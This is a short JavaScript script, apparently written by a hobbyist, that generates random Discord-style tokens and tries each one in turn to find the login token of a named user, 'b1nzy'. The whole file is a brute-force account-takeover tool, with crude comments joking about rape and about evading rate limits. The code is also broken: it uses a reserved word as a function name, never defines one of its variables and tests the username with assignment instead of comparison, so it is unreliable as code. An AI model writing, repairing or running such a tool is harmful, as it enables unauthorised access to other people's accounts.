//yeah ok
const discord = require("discordie"); //i use discordie b'cuz lazy
var user = new Discordie(); //user object
var start = ["Mj", "its_a_bot"];
var length = [59, 64, 57]; //some tokens are 59 chars longs and some are 64 chars long, mainly 59 though.
function do(token, name) { 
    try{
    user.connect({
        token: token
    });   
    client.Dispatcher.on("GATEWAY_READY", a => {
        console.log("Connected as " + client.User.username + " with token: " + token);
        if (client.User.username = name) {
            console.log("Yay! Found " + client.User.username + "'s token, it's "+ token);
        } else {
            console.log(" User " + client.User.username + " with token: "+ token + " is not target"); //rape joke
        }
    });
    } catch (err) {
    gener8(name);
    }
}
function gener8(name) { 
    try{
         //you can joke about murder but not about rape :'(
         var token = ""; //tokin
         var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZ.abcdefghijklmnopqrstuvwxyz-0123456789_"; //lol
         //stealing from stackoverflow since 2007
         //change to length[2] for 64 chars
         //if user use this
         /* for (var i = 0; i < length[3]; i++) 
              token += possible.charAt(Math.floor(Math.random() * possible.length));
         */
         for (var i = 0; i < length[1]; i++) 
              token += possible.charAt(Math.floor(Math.random() * possible.length));
        //if user:
        //do(start[1] + token, name)
        do(token, name);
    } catch (err) {
        console.log("lol error");
    }
}
function do_it(name) { 
    try{
         gener8(name);
    } catch (err) {
        console.log("lol error");
    }
}
do_it("b1nzy"); //b1nzy dont ratelimit me ;-;
//dabbit is the god
